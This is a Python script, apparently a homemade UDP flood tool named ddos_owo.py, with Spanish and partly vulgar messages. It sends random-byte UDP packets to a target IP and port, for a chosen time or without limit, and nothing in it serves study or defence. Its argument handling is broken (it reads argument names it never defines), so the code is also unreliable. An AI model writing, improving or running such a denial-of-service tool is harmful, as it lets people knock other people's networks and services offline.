from time import time as tt
import argparse
import socket
import random
import os

def attack(ip, port, time, size):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(65535, port))

    fmt = 'Atacando {ip} en {port} por {time} con un tamaño de {size} paquetes.'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports',
        time='{time} seconds'.format(time=time) if str(time).isdigit() else 'unlimited time',
        size=size
    )
    print(fmt)

    startup = tt()
    size = os.urandom(min(65500, size))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or random.randint(1, 65535)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(size, (ip, port))

    print('Ataque Finalizado Perro.')

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Usa esto: python ddos_owo.py <ip> <port> <time> <size>')

    parser.add_argument('ip', type=str, help='IP de la persona puto xd')
    parser.add_argument('-p', '--puerto', type=int, default=None, help='Puerto.')
    parser.add_argument('-t', '--tiempo', type=int, default=None, help='Tiempo.')
    parser.add_argument('-s', '--paquetes', type=int, default=1024, help='Paquetes.')

    args = parser.parse_args()

    try:
        attack(args.ip, args.port, args.time, args.size)
    except KeyboardInterrupt:
        print('Ataque Detenido')
